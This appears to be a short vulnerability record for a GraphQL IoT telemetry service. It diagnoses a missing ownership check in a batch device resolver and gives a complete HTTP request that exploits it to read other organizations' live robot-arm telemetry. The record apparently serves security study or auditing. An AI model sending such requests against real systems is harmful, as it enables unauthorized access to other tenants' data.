diagnosis: The batch delegation resolver accepts client-provided device serialNumbers and delegates batch queries to the telemetry subschema without verifying if context.user.organizationId owns each device. An attacker querying devices(serialNumbers: [...]) can batch-extract live telemetry data from IoT devices belonging to other organizations.
exploit_request:
POST /graphql HTTP/1.1
Host: iotmesh.factorygate.com
Authorization: Bearer eyJhbGciOiJIUzI1Ni...
Content-Type: application/json

{
  "query": "query { devices(serialNumbers: [\"SN-ROBOT-ARM-990\", \"SN-ROBOT-ARM-991\"]) { serialNumber liveTelemetry { rpm temperature } } }"
}
